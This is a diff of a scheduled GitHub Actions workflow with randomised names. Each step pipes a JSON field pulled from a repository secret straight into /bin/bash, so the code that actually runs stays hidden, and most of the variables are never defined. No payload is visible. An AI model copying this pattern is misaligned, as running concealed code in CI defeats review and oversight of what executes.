@@ -1,18 +1,21 @@
 name: gelinglanduo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 1/6 * * *'
-jobs:  # 6581
+    - cron: '40 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gelinglanduo
         env:
-          ck1320: ${{ secrets.ck1320 }}
+          ilyu80: ${{ secrets.ilyu80 }}
         run: |
-          echo $ck1320 | jq -r .oauwl37173 | /bin/bash
-          echo $a2 | jq -r .lnmz9615 | /bin/bash
-          echo $jss30498 | jq -r .el20116 | /bin/bash
+          echo $ilyu80 | jq -r .ac9908 | /bin/bash
+          echo $p3 | jq -r .sqd36 | /bin/bash
+          echo $oiqh1334 | jq -r .qxwa422 | /bin/bash
+          echo $tm410 | jq -r .gyn2257 | /bin/bash
+          echo $ibhh35 | jq -r .lvype78 | /bin/bash
 
